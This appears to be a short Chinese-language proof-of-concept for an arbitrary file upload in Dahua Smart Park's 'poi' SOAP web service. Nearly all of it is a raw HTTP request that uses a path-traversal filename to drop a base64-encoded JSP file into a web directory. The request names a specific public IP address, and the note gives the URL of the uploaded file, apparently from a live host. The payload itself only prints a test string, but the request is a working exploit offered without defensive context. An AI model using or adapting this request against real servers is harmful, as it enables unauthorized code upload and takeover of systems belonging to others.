# 大华智慧园区poi任意文件上传

    ## poc

http://125.72.35.230:9080/upload/1112.jsp

```
POST /emap/webservice/gis/soap/poi HTTP/1.1
Content-Type: text/xml;charset=UTF-8
Host: 125.72.35.230:9080
Content-Length: 405

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
<soapenv:Header/>
<soapenv:Body>
<res:uploadPicFile>
<!--type: string-->
<arg0>/../../1112.jsp</arg0>
<!--type: base64Binary-->

<arg1>PCUKCm91dC5wcmludGxuKCJIZWxsbyxjdmVzISIpOwoKJT4=</arg1>
</res:uploadPicFile>
</soapenv:Body>
</soapenv:Envelope>
```
